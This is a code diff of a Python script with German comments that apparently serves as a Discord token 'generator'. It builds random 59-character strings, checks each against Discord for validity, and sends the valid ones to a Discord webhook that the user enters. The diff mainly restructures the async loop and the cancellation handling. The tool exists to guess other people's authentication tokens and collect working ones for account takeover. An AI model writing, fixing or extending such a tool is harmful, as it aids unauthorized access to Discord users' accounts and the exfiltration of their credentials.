@@ -2,9 +2,9 @@ import asyncio
 import random
 import string
 import os
+import requests
 from aiohttp import ClientSession
 from colorama import Fore, Style, init
-import requests
 
 # Initialisierung für die Farben
 init(autoreset=True)
@@ -19,22 +19,17 @@ def draw_box(title, content):
     print(f"{Fore.CYAN}{border}{Style.RESET_ALL}")
 
 # Token-Generator-Funktion
-async def token_generator(session):
-    valid_tokens = []
-    invalid_tokens = []
-    try:
-        while True:
-            token = ''.join(random.choices(string.ascii_letters + string.digits, k=59))
-            valid = await token_checker(session, token)
-            if valid:
-                valid_tokens.append(token)
-                print(f"{Fore.GREEN}[VALID] {token}")
-            else:
-                invalid_tokens.append(token)
-                print(f"{Fore.RED}[INVALID] {token}")
-            await asyncio.sleep(0.1)
-    except asyncio.CancelledError:
-        return valid_tokens, invalid_tokens
+async def token_generator(session, valid_tokens, invalid_tokens):
+    while True:
+        token = ''.join(random.choices(string.ascii_letters + string.digits, k=59))
+        valid = await token_checker(session, token)
+        if valid:
+            valid_tokens.append(token)
+            print(f"{Fore.GREEN}[VALID] {token}")
+        else:
+            invalid_tokens.append(token)
+            print(f"{Fore.RED}[INVALID] {token}")
+        await asyncio.sleep(0.1)
 
 # Überprüfung der Token-Gültigkeit
 async def token_checker(session, token):
@@ -47,17 +42,19 @@ async def token_checker(session, token):
         return False
 
 # Funktion zum kontinuierlichen Generieren bis zur Eingabe
-async def generate_until_stopped(generator, *args):
-    task = asyncio.create_task(generator(*args))
-    while True:
-        if input() == '':
-            task.cancel()
-            try:
-                valid_tokens, invalid_tokens = await task
-                return valid_tokens, invalid_tokens
-            except asyncio.CancelledError:
-                return [], []
-            break
+async def generate_until_stopped(valid_tokens, invalid_tokens):
+    task = asyncio.create_task(token_generator(ClientSession(), valid_tokens, invalid_tokens))
+    try:
+        while True:
+            if input() == '':
+                task.cancel()
+                try:
+                    await task
+                except asyncio.CancelledError:
+                    return
+    except KeyboardInterrupt:
+        task.cancel()
+        await task
 
 # Funktion zum Speichern der Tokens und Senden an Discord Webhook
 def save_and_send(valid_tokens, webhook_url):
@@ -85,11 +82,12 @@ async def show_menu():
         if choice == '1':
             webhook_url = input("Enter your Discord Webhook URL: ")
             print("Generating Discord Tokens... Press Enter to stop.")
-            async with ClientSession() as session:
-                valid_tokens, invalid_tokens = await generate_until_stopped(token_generator, session)
-                draw_box("Generation Completed", f"Valid Tokens: {len(valid_tokens)}\nInvalid Tokens: {len(invalid_tokens)}")
-                if valid_tokens:
-                    save_and_send(valid_tokens, webhook_url)
+            valid_tokens = []
+            invalid_tokens = []
+            await generate_until_stopped(valid_tokens, invalid_tokens)
+            draw_box("Generation Completed", f"Valid Tokens: {len(valid_tokens)}\nInvalid Tokens: {len(invalid_tokens)}")
+            if valid_tokens:
+                save_and_send(valid_tokens, webhook_url)
         elif choice == '2':
             break
         else:
